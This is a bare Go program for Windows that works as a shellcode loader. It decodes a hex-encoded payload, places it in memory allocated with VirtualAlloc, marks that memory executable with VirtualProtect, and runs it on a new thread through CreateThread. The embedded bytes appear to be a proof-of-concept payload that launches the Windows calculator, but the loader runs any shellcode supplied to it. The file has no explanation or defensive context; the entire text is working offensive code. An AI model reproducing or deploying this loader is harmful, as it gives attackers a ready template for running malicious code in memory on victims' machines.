package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"log"
	"unsafe"
)

var (
	kernel32      = windows.NewLazySystemDLL("kernel32.dll")
	rtlCopyMemory = kernel32.NewProc("RtlCopyMemory")
	createThread  = kernel32.NewProc("CreateThread")
)

func main() {
	shellcode, _ := hex.DecodeString("505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3")

	shellcodeExec, err := windows.VirtualAlloc(
		uintptr(0),
		uintptr(len(shellcode)),
		windows.MEM_COMMIT|windows.MEM_RESERVE,
		windows.PAGE_READWRITE)
	if err != nil {
		log.Fatal("Error while VirtualAlloc:", err)
	}

	_, _, err = rtlCopyMemory.Call(
		shellcodeExec,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)))
	if err.Error() != "The operation completed successfully." {
		log.Fatal("Error while RtlCopyMemory:", err)
	}

	var oldProtect uint32
	err = windows.VirtualProtect(
		shellcodeExec,
		uintptr(len(shellcode)),
		windows.PAGE_EXECUTE_READ,
		&oldProtect)
	if err != nil {
		log.Fatal("Error while VirtualProtect:", err)
	}

	hThread, _, err := createThread.Call(
		0,
		0,
		shellcodeExec,
		uintptr(0),
		0,
		0)

	if err.Error() != "The operation completed successfully." {
		log.Fatal("Error while CreateThread:", err)
	}

	_, err = windows.WaitForSingleObject(
		windows.Handle(hThread),
		windows.INFINITE)
	if err != nil {
		log.Fatal("Error while WaitForSingleObject:", err)
	}
}
